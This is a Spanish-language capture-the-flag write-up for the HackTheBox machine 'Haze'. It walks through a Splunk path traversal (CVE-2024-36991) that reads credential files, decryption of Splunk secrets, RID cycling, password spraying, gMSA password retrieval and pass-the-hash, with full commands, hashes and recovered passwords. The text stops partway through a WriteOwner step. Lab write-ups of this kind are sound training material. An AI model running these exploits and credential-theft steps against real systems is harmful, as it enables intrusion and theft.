---
title: Haze - Hard (HTB)
permalink: /Haze-HTB-Writeup/
tags:
  - "Windows"
  - "Hard"
  - "Splunk"
  - "Path Traversal"
  - "CVE-2024-36991"
  - "Splunk Passwords"
  - "RID Cycling"
  - "BloodHound"
  - "ACL Rights"
  - "WriteOwner"
  - "AddKeyCredentialLink"
  - "Shadow Credentials"
  - "gMSA Abuse"
  - "WriteProperty"
  - "ReadGMSAPassword"
  - "PassTheHash"
  - "SeImpersonatePrivilege"
  - "GodPotato.exe"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Haze - Hard (HTB)
seo_description: Practica explotación de un CVE dentro de Splunk Enterprise, derechos ACL en un entorno de Active Directory, Shadow Credentials, abuso de gMSA y SeImpersonatePrivilege para vencer Haze.
excerpt: Practica explotación de un CVE dentro de Splunk Enterprise, derechos ACL en un entorno de Active Directory, Shadow Credentials, abuso de gMSA y SeImpersonatePrivilege para vencer Haze.
header:
  overlay_image: /assets/images/headers/haze-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/haze-hackthebox.jpg
---

![image-center](/assets/images/posts/haze-hackthebox.png)
{: .align-center}

**Habilidades:** `Splunk` Path Traversal (CVE-2024-36991), Decrypting `Splunk` Passwords, RID Cycling Attack, Domain Analysis with Bloodhound, Abusing `Write` Permissions to Read `gMSA` Passwords, PassTheHash, Abusing ACL - `WriteOwner` Rights, Shadow Credentials, Abusing `Splunk` Backup to Decrypt `admin` Password, Reverse Shell via Malicious `Splunk` App From File, Abusing `SeImpersontatePrivilege` - `GodPotato.exe` [Privilege Escalation]
{: .notice--primary}

# Introducción

Haze es una máquina Windows de dificultad `Hard`, donde debemos vulnerar un escenario de Active Directory a través de Path Traversal en `Splunk`, descifrar contraseñas y abusar de derechos ACL para ganar acceso inicial. Abusaremos de acceso administrativo en `Splunk` para escalar privilegios y ganar control total del dominio.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.61                                                                                                                      
PING 10.10.11.61 (10.10.11.61) 56(84) bytes of data.
64 bytes from 10.10.11.61: icmp_seq=1 ttl=127 time=236 ms

--- 10.10.11.61 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 236.088/236.088/236.088/0.000 ms
~~~


## Nmap Scanning 

Realizaremos un escaneo que identifique puertos abiertos en la máquina víctima, con el propósito de identificar servicios expuestos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.61 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 18:39 EDT
Nmap scan report for 10.10.11.61
Host is up (0.23s latency).
Not shown: 65480 closed tcp ports (reset), 25 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8000/tcp  open  http-alt
8088/tcp  open  radan-http
8089/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
54031/tcp open  unknown
61120/tcp open  unknown
61121/tcp open  unknown
61136/tcp open  unknown
61139/tcp open  unknown
61153/tcp open  unknown
61161/tcp open  unknown
61215/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo a estos puertos abiertos que hemos descubierto para identificar la versión y los servicios que se están ejecutando

~~~ bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49669,54031,61120,61121,61136,61139,61153,61161,61215 -sVC 10.10.11.61 -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 18:45 EDT
Nmap scan report for 10.10.11.61
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 06:45:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Site doesn\'t have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
8088/tcp  open  ssl/http      Splunkd httpd
|_http-title: 404 Not Found
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
8089/tcp  open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-server-header: Splunkd
|_http-title: splunkd
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
54031/tcp open  msrpc         Microsoft Windows RPC
61120/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61121/tcp open  msrpc         Microsoft Windows RPC
61136/tcp open  msrpc         Microsoft Windows RPC
61139/tcp open  msrpc         Microsoft Windows RPC
61153/tcp open  msrpc         Microsoft Windows RPC
61161/tcp open  msrpc         Microsoft Windows RPC
61215/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-24T06:46:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.07 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos una gran cantidad de servicios, por lo que podemos decir que estamos frente a un controlador de Dominio de Active Directory. Vemos información como el nombre del DC y del dominio, el cual es `haze.htb`, agregaremos esto a nuestro archivo `/etc/hosts` para aplicar la resolución DNS

~~~ bash
cat /etc/hosts | grep haze.htb 

10.10.11.61 haze.htb dc01.haze.htb
~~~


## Web Analysis

Veremos diversos servicios HTTP ejecutándose en los puertos `8000` y similares, a diferencia de los típicos para el servicio WinRM, podemos ver que se trata de `Splunk` por el título de la web

~~~ bash
whatweb http://haze.htb:8000                                                                      
http://haze.htb:8000 [303 See Other] Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[10.10.11.61], Meta-Refresh-Redirect[http://haze.htb:8000/en-US/], RedirectLocation[http://haze.htb:8000/en-US/], Title[303 See Other], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]

http://haze.htb:8000/en-US/ [303 See Other] Cookies[session_id_8000], Country[RESERVED][ZZ], HTTPServer[Splunkd], HttpOnly[session_id_8000], IP[10.10.11.61], RedirectLocation[http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]

http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F [200 OK] Bootstrap, Cookies[cval,splunkweb_uid], Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[10.10.11.61], Meta-Author[Splunk Inc.], Script[text/json], probably Splunk, UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]
~~~

Si navegamos a `haze.htb:8000` veremos la web de inicio de sesión de `Splunk`, además de que el servidor nos redirige a `http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F`

![image-center](/assets/images/posts/haze-splunk-analysis.png)
{: .align-center}

Como el puerto `8089` también se encuentra abierto además de relacionarse con el servicio, podemos ver la versión de `Splunk` a través de consultarlo en la web utilizando el protocolo HTTPS o con `curl`

~~~ bash
curl -s https://haze.htb:8089 -k | grep version

<?xml version="1.0" encoding="UTF-8"?>
  <generator build="78803f08aabb" version="9.2.1"/>
~~~

Vemos que la versión de `Splunk` es la `9.2.1`

![image-center](/assets/images/posts/haze-splunk-analysis-2.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## `Splunk` 9.2.1 Path Traversal (CVE-2024-36991)

Existe una vulnerabilidad que afecta al endpoint `/modules/messaging` la aplicación web de `Splunk` en esta versión. Esto nos permitiría recorrer directorios para leer otros archivos del sistema (a los que tengamos acceso).

Podemos aprovechar esto realizando una solicitud HTTP a `/messaging` de la siguiente manera, donde retrocederemos unos cuantos directorios hasta alcanzar un archivo del sistema

~~~ bash
/modules/messaging/../../../../../etc/passwd
~~~

Como estamos en un entorno `Windows`, debemos manipular ligeramente la URL para apuntar a archivos confidenciales, como `/etc/passwd`, que existe dentro de la carpeta `C:/Program Files/Splunk/`. Haremos pruebas retrocediendo directorios hasta que veamos el archivo

~~~ bash
curl -s http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd

:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
~~~

Rápidamente podemos extraer los hashes y guardarlos en un archivo, por ejemplo `hashes.txt`

~~~ bash
curl -s http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd > etc_passwd.txt | awk -F ':' '{print $3}' > hashes.txt
~~~


## (Posible) Hash Cracking

Con estos hashes, que corresponden al formato `sha512crypt`, si intentamos descifrarlos, nos llevará un largo largo tiempo dado que son varios hashes, donde posiblemente encontremos alguna contraseña que figure dentro del archivo `rockyou.txt`. Sin embargo, decidí abandonar esta posibilidad

~~~ bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt
~~~


## Reading `Splunk` Confidential Files

Con una búsqueda rápida podremos encontrar un listado de archivos sensibles así como la ruta de acceso

- `/etc/passwd`: Este archivo es utilizado en la autenticación de usuarios, similar al `/etc/passwd` de Linux, solo que guarda los hashes directamente
- `/etc/apps/appname/local/authentication.conf`: Configuración de autenticación, usuarios LDAP, etc.
- `/etc/auth/splunk.secret`: Clave maestra que se utiliza para encriptar información dentro de `Splunk`, con ella podríamos intentar desencriptar las contraseñas en formato hash que encontramos.

Consultaremos la clave interna de `Splunk`, la utilizaremos para desencriptar credenciales

~~~ bash
curl -s http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret > secret.txt

cat secret.txt
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD#
~~~

Consultaremos el archivo `authentication.conf` para ver credenciales válidas que podamos desencriptar y utilizar en el protocolo LDAP

~~~ bash
curl -s http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf                
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
~~~


## Decrypting Splunk Passwords

Podemos utilizar el siguiente [repositorio](https://github.com/HurricaneLabs/splunksecrets) para utilizar la clave secreta y desencriptar las credenciales que obtuvimos en el archivo `authentication.conf`

~~~ bash
splunksecrets splunk-decrypt -S secret.txt --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='

Ld@p_Auth_Sp1unk@2k24
~~~

Podemos construir un script de bash que obtenga un listado de nombres y los convierta en posibles nombres de usuario según el formato comúnmente usado en Active Directory

~~~ bash
#!/bin/bash

if [ "$#" -lt 2 ]; then
echo -e "\nConvert names to common username format in Active Directory"
    echo -e "\n[*] Usage: $0 <input_filename> <output_filename>"
    echo "[*] Example: $0 names.txt users.txt"
    echo -e "\n[*] Expected format of the input file: 'Firstname Lastname' per line, for example:
    Paul Taylor
    Jake Paul
    Arthur Schopenhauer\n"
    exit 1
fi

input="$1"
output="$2"

> "$output"

while read -r name lastname; do
    name_lc=$(echo "$name" | tr '[:upper:]' '[:lower:]')
    lastname_lc=$(echo "$lastname" | tr '[:upper:]' '[:lower:]')

    echo "${name_lc}${lastname_lc}"       >> "$output"  # davidanderson
    echo "${name_lc}.${lastname_lc}"      >> "$output"  # david.anderson
    echo "${name_lc}_${lastname_lc}"      >> "$output"  # david_anderson
    echo "${name_lc}"                     >> "$output"  # david
    echo "${lastname_lc}"                   >> "$output"  # anderson
    echo "${name_lc:0:1}${lastname_lc}"   >> "$output"  # danderson
    echo "${name_lc:0:1}.${lastname_lc}"  >> "$output"  # d.anderson
    echo "${lastname_lc}${name_lc}"       >> "$output"  # andersondavid
done < "$input"

sort -u "$output" -o "$output"  # Quitar duplicados y guardar
~~~

Ahora crearemos un archivo `name.txt` que contenga el nombre del usuario: `Paul Taylor`. Posteriormente ejecutaremos la pequeña herramienta de la siguiente manera

~~~ bash
bash name2username.sh name.txt paul.txt
~~~

Se nos creará un listado con todas las posibles combinaciones de nombre de usuario para `Paul Taylor`

~~~ bash
paul
paul.taylor
paul_taylor
paultaylor
p.taylor
ptaylor
taylor
taylorpaul
~~~

Usaremos esta lista para intentar autenticarnos con cada nombre de usuario generado y la contraseña que encontramos para `Paul Taylor`

~~~ bash
nxc smb dc01.haze.htb -u paul.txt -p 'Ld@p_Auth_Sp1unk@2k24' 
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
~~~

Si intentamos enumerar usuarios o grupos del dominio, no podremos consultar más que nuestra información


## RID Cycling Attack

Al intentar enumerar usuarios del dominio ya sea desde `netexec` o `rpcclient`, veremos solo nuestro nombre de usuario. Esto se deba posiblemente a que el usuario `paul.taylor` posea restricciones configuradas. Es por eso que optaremos por realizar fuerza bruta a los valores de RID para descubrir usuarios y grupos del dominio

> Luego de un análisis posterior, podemos llegar a la conclusión que esto se debe a que el usuario `paul.taylor` forma parte del grupo `Restricted Users`, lo que le prohíbe enumerar usuarios, grupos o OU (Unidad Organizativa), solamente puede **consultar información de su propia cuenta**
{: .notice--warning}

~~~ bash
nxc smb dc01.haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute > users.txt
~~~

Ahora haremos un pequeño tratamiento para poder construir nuestro listado de usuarios

~~~ bash
cat users.txt | grep SidTypeUser | awk -F 'HAZE' '{ print $2 }'| tr -d '\\' | cut -d ' ' -f1-1 | sponge users.txt
~~~


## Password Spraying

Las credenciales que conseguimos podrían ser válidas para otras cuentas del dominio, intentaremos utilizar la contraseña para todos los usuarios encontrados

~~~ bash
kerbrute passwordspray -d haze.htb --dc dc01.haze.htb users.txt 'Ld@p_Auth_Sp1unk@2k24' 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/28/25 - Ronnie Flathers @ropnop

2025/06/28 22:43:58 >  Using KDC(s):
2025/06/28 22:43:58 >  	dc01.haze.htb:88

2025/06/28 22:44:00 >  [+] VALID LOGIN:	mark.adams@haze.htb:Ld@p_Auth_Sp1unk@2k24
2025/06/28 22:44:00 >  [+] VALID LOGIN:	paul.taylor@haze.htb:Ld@p_Auth_Sp1unk@2k24
2025/06/28 22:44:00 >  Done! Tested 9 logins (2 successes) in 1.627 seconds
~~~

Podemos autenticarnos como `mark.adams` con la misma contraseña que para `paul.taylor`


## Domain Analysis - Bloodhound

Dado que ahora tenemos un usuario que no posee las restricciones anteriores (podemos comprobarlo intentando las técnicas anteriores). Recolectaremos información del dominio para analizarla con `Bloodhound`

~~~ bash
bloodhound-python -d haze.htb -ns 10.10.11.61 --zip -c All -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'
~~~


## Shell as `mark.adams`

El usuario `mark.adams` forma parte del grupo `Remote Management Users`, esto le permite conectarse al dominio con una consola de `powershell`

~~~ bash
evil-winrm -i dc01.haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'

*Evil-WinRM* PS C:\Users\mark.adams\Documents>
~~~


## Enumerating Group Managed Services Accounts (`gMSA`)

Si vemos los grupos a los que pertenece el usuario `mark.adams`, forma parte de `gMSA_Managers`

~~~ bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> whoami /groups 

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE\gMSA_Managers                          Group            S-1-5-21-323145914-28650650-2368316563-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
~~~

Podemos listar las cuentas `gMSA` con el siguiente comando

> Cuenta de Servicio Administrada de Grupo, es un tipo de cuenta de dominio que facilita la administración de servicios que se ejecutan en múltiples servidores
{: .notice--info}

~~~ bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Filter * 


DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled           : True
Name              : Haze-IT-Backup
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780
SamAccountName    : Haze-IT-Backup$
SID               : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName :
~~~


## Abusing WriteProperty Permissions to Read `gMSA` Password

Como el usuario actual, no disponemos de los permisos suficientes para obtener las credenciales `gMSA` 

~~~ bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount Haze-IT-Backup$ -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=Domain Admins,CN=Users,DC=haze,DC=htb}
~~~

Haremos una enumeración de los permisos sobre esta cuenta `gMSA` con [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1), aunque puedes utilizar otras herramientas como `bloodyAD` o comandos nativos como `dsacls`

~~~ bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ObjectAcl -SamAccountName 'Haze-IT-Backup$' -ResolveGUIDs

AceQualifier           : AccessDenied
ObjectDN               : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : ms-DS-ManagedPasswordPreviousId
ObjectSID              : S-1-5-21-323145914-28650650-2368316563-1111
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessDeniedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-323145914-28650650-2368316563-1103
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

...
...
...
~~~

Mucha información para estar viendo manualmente si hay permisos para `gMSA_Managers`, así que aplicaremos un filtro y aplicaremos otra función

~~~ bash
*Evil-WinRM* PS C:\Temp> Find-InterestingDomainAcl -ResolveGUIDS | ?{$_.IdentityReferenceName -match "gMSA_Managers"}


ObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : ms-DS-GroupMSAMembership
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107
IdentityReferenceName   : gMSA_Managers
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
IdentityReferenceClass  : group
~~~

### Granting Permissions to Retrieve `gMSA` Password

El grupo `gMSA_Managers` tiene la capacidad de modificar las propiedades de la cuenta `Haze-IT-Backup` gracias al permiso `WriteProperty`, asignaremos al usuario `mark.adams` como alguien que pueda leer las credenciales de `gMSA`

~~~ bash
*Evil-WinRM* PS C:\Temp> Set-ADServiceAccount 'Haze-IT-Backup$' -PrincipalsAllowedToRetrieveManagedPassword mark.adams
~~~

Ahora con el usuario `mark.adams` deberíamos ser capaces de leer las credenciales `gMSA`

~~~ bash
bloodyAD --host dc01.haze.htb -d haze.htb --dc-ip 10.10.11.61 -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' get object 'Haze-IT-Backup$' --attr msDS-ManagedPassword 

distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:4de830d1d58c14e241aff55f82ecdba1
msDS-ManagedPassword.B64ENCODED: biM0DnGKzlEE4Y4pbu4a21ybJTwLnhITfXWzyJVkPA20dLv0GqrQ3/VMvh6zW5/O9118dpSXRkpk0HfMCiBd/HsZ2pC3b4mJIvgOfYK+1M5wB9QSxKe3k4xgKfjrwFglj4pHJG9LUsTXdLAyPi9RwbJTY7G8zSr2p1tQZhiI0zLjXNAOek0XGUovDw8NHD0OQOVWjjGMtEZkdIB/FnaRiJFKdpCyGYKOw/JDf4mTy23h/irv8p9UQbzw85n5I/CcFEPhhHtidCbQMmSIiZsdVzY81QnuNqvEXAgv9bzNaVhyewCdYXY4F+ir/8qQAejtiksHy/wpPFMsOpOw8BnKvA==
~~~

Ya podremos autenticarnos como la cuenta `Haze-IT-Backup$` en el dominio, más no podemos conectarnos vía `powershell`

~~~ bash
nxc smb dc01.haze.htb -u 'Haze-IT-Backup$' -H '4de830d1d58c14e241aff55f82ecdba1'
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\Haze-IT-Backup$:4de830d1d58c14e241aff55f82ecdba1

nxc winrm dc01.haze.htb -u 'Haze-IT-Backup$' -H '4de830d1d58c14e241aff55f82ecdba1'
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
WINRM       10.10.11.61     5985   DC01             [-] haze.htb\Haze-IT-Backup$:4de830d1d58c14e241aff55f82ecdba1
~~~


## Abusing ACL - `WriteOwner` Rights

La cuenta `Haze-IT-Backup$` posee derechos `WriteOwner` sobre el grupo `Support_Services`, esto nos permite modificar el propietario del grupo

![image-center](/assets/images/posts/haze-bloodhound.png)
{: .align-center}

Realizaremos una serie de pasos que nos brindarán control sobre el grupo. Primeramente solicitaremos un TGT (Ticket Granting Ticket) para utilizar autenticación `kerberos`

~~~ bash
ntpdate 10.10.11.61 && getTGT.py haze.htb/Haze-IT-Backup -hashes :4de830d1d58c14e241aff55f82ecdba1 -dc-ip 10.10.11.61
2025-06-29 00:09:30.48961 (-0400) +0.210397 +/- 0.167326 10.10.11.61 s1 no-leap
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Haze-IT-Backup.ccache
~~~

Asignaremos a la cuenta `Haze-IT-Backup$` como propietario del grupo `Support_Services`

~~~ bash
